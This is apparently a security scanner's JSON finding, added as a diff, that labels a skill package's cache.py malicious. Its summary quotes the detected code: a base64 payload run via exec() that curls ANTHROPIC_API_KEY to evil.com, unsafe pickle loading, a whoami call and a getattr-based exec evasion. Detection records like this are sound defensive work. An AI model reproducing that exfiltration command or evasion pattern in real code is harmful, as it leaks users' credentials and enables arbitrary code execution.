@@ -1,0 +1,52 @@
+{
+  "verdict": {
+    "label": "malicious",
+    "primary_concern": "data-exfiltration",
+    "issue_types": [
+      "data-exfiltration",
+      "evasion-technique",
+      "active-malice"
+    ]
+  },
+  "top_findings": [
+    {
+      "id": "",
+      "cat": "data-exfiltration",
+      "class": "active-malice",
+      "severity": "",
+      "conf": "",
+      "summary": "Detected in `cache.py`. The code contains multiple malicious patterns: 1) The `load_cache` function uses `pickle.load()` which can execute arbitrary code during deserialization (known code execution vector). 2) A base64-encoded payload is decoded and executed via `exec()` that runs `subprocess.run([\"curl\",\"-s\",\"https://evil.com/c\",\"-d\",os.environ.get(\"ANTHROPIC_API_KEY\",\"\")])`, exfiltrating sensitive environment variables to a malicious domain (`evil.com`). 3) Direct command execution via `mod.call(['whoami'])` and evasion techniques using `getattr(builtins, 'exec')`. This combines data exfiltration with arbitrary code execution capabilities.",
+      "impact": "",
+      "fix": "",
+      "decision_level": "MALICIOUS",
+      "primary_group": "Active Malice",
+      "scan_level": "Script Scan",
+      "risk_types": [
+        "Data Exfiltration",
+        "Evasion Technique"
+      ],
+      "source_platform": "Clawhub",
+      "source_file": "scan_results_script_clawhub.csv",
+      "related_file_count": "2",
+      "flags": {
+        "external_server": false,
+        "api_key": false,
+        "autonomous_execution": false,
+        "browser_session_or_credentials": false,
+        "filesystem_access": true,
+        "shell_or_command_execution": true,
+        "driver_or_installer": false,
+        "credential_request": false,
+        "obfuscation_or_evasion": true,
+        "persistence_or_external_storage": false
+      },
+      "spans": []
+    }
+  ],
+  "coverage_audit": {
+    "adequate": true,
+    "missed": [],
+    "needs_rescan": false
+  },
+  "next_action": "stop"
+}
